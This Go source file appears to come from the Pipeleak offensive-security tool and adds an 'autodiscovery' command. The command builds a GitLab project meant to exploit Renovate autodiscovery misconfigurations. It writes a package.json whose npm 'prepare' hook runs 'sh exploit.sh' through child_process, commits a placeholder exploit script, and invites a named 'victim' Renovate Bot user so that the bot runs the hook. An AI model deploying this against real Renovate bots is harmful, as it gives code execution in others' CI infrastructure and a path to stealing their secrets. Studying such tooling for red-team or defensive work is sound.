package renovate

import (
	"github.com/CompassSecurity/pipeleak/cmd/gitlab/util"
	"github.com/CompassSecurity/pipeleak/helper"
	"github.com/rs/zerolog/log"
	"github.com/spf13/cobra"
	gogitlab "gitlab.com/gitlab-org/api/client-go"
)

var (
	repoName string
	username string
)

var renovateJson = `
{
    "$schema": "https://docs.renovatebot.com/renovate-schema.json",
    "extends": [
       "config:recommended"
    ],
    "force": {
      "constraints": {
         "npm": "9.2.0"
      }
   },
   "skipInstalls": false,
   "postUpdateOptions": ["npmDedupe"]
}
`

var packageJson = `
{
    "name": "pipeleak_autodiscovery_sink",
    "repository": {
      "type": "git",
      "url": "git://github.com/username/repository.git"
    },
    "version": "1.0.0",
    "description": "PoC",
    "main": "index.js",
    "scripts": {
      "test": "echo \"Error: no test specified\" && exit 1",
      "prepare": "node -e \"require('child_process').exec('sh exploit.sh', (err, stdout, stderr) => { if (err) { console.error(err); return; } console.log(stdout); });\""
    },
    "author": "",
    "license": "ISC",
    "workspaces": [
          "."
    ],
    "dependencies": {
      "cowsay": "^1.0.0"
    }
  }
`

var packageLockJson = `
{
    "name": "tmp",
    "lockfileVersion": 3,
    "requires": true,
    "packages": {
      "": {
        "dependencies": {
          "cowsay": "^1.0.0"
        }
      },
      "node_modules/cowsay": {
        "version": "1.0.0",
        "resolved": "https://registry.npmjs.org/cowsay/-/cowsay-1.0.0.tgz",
        "integrity": "sha512-o5QoTkUdzQDGSJi6Zwjyxew8fSP+px3vdph+EoFHnk/UTZs4Ir/QuoxAB+9vdiAaUc/Nv7NieFMQxw7ar0dK3Q==",
        "dependencies": {
          "optimist": "~0.3.5"
        },
        "bin": {
          "cowsay": "cli.js",
          "cowthink": "cli.js"
        },
        "engines": {
          "node": ">=0.6.17"
        }
      },
      "node_modules/optimist": {
        "version": "0.3.7",
        "resolved": "https://registry.npmjs.org/optimist/-/optimist-0.3.7.tgz",
        "integrity": "sha512-TCx0dXQzVtSCg2OgY/bO9hjM9cV4XYx09TVK+s3+FhkjT6LovsLe+pPMzpWf+6yXK/hUizs2gUoTw3jHM0VaTQ==",
        "license": "MIT/X11",
        "dependencies": {
          "wordwrap": "~0.0.2"
        }
      },
      "node_modules/wordwrap": {
        "version": "0.0.3",
        "resolved": "https://registry.npmjs.org/wordwrap/-/wordwrap-0.0.3.tgz",
        "integrity": "sha512-1tMA907+V4QmxV7dbRvb4/8MaRALK6q9Abid3ndMYnbyo8piisCmeONVqVSXqQA3KaP4SLt5b7ud6E2sqP8TFw==",
        "license": "MIT",
        "engines": {
          "node": ">=0.4.0"
        }
      }
    }
  }
`

var exploitScript = `
#!/usr/bin/env sh

# malicious script
echo "This script is executed by Renovate during the renovation process. Exploit it to leak sensitive information or perform unauthorized actions."
`

func NewAutodiscoveryCmd() *cobra.Command {
	autodiscoveryCmd := &cobra.Command{
		Use:   "autodiscovery [no options!]",
		Short: "Create a PoC for Renovate Autodiscovery misconfigurations exploitation",
		Run:   Generate,
	}
	autodiscoveryCmd.Flags().StringVarP(&repoName, "repoName", "r", "", "The name for the created repository")
	autodiscoveryCmd.Flags().StringVarP(&username, "username", "u", "", "The username of the victim Renovate Bot user to invite")

	return autodiscoveryCmd
}

func Generate(cmd *cobra.Command, args []string) {
	helper.SetLogLevel(verbose)
	git, err := util.GetGitlabClient(gitlabApiToken, gitlabUrl)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating gitlab client")
	}

	if repoName == "" {
		repoName = helper.RandomStringN(5) + "-pipeleak-renovate-autodiscovery-poc"
	}

	opts := &gogitlab.CreateProjectOptions{
		Name:        gogitlab.Ptr(repoName),
		JobsEnabled: gogitlab.Ptr(true),
	}

	project, _, err := git.Projects.CreateProject(opts)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating project")
	}
	log.Info().Str("name", project.Name).Str("url", project.WebURL).Msg("Created project")

	createFile("renovate.json", renovateJson, git, project.ID, false)
	createFile("package.json", packageJson, git, project.ID, false)
	createFile("package-lock.json", packageLockJson, git, project.ID, false)
	createFile("exploit.sh", exploitScript, git, project.ID, true)

	if username == "" {
		log.Info().Msg("No username provided, you must invite the victim Renovate Bot user manually to the created project")
	} else {
		invite(git, project, username)
	}

	log.Info().Msg("Make sure to update the exploit.sh script with the actual exploit code")
	log.Info().Msg("Then wait until the created project is renovated by the invited by the Renovate Bot user")
}

func invite(git *gogitlab.Client, project *gogitlab.Project, username string) {
	log.Info().Str("user", username).Msg("Inviting user to project")

	git.ProjectMembers.AddProjectMember(project.ID, &gogitlab.AddProjectMemberOptions{
		Username:    gogitlab.Ptr(username),
		AccessLevel: gogitlab.Ptr(gogitlab.DeveloperPermissions),
	})
}

func createFile(fileName string, content string, git *gogitlab.Client, projectId int, executable bool) {
	fileOpts := &gogitlab.CreateFileOptions{
		Branch:          gogitlab.Ptr("main"),
		Content:         gogitlab.Ptr(content),
		CommitMessage:   gogitlab.Ptr("Pipeleak create " + fileName),
		ExecuteFilemode: gogitlab.Ptr(executable),
	}
	fileInfo, _, err := git.RepositoryFiles.CreateFile(projectId, fileName, fileOpts)

	if err != nil {
		log.Fatal().Stack().Err(err).Str("fileName", fileName).Msg("Creating file failed")
	}

	log.Info().Str("file", fileInfo.FilePath).Msg("Created file")
}
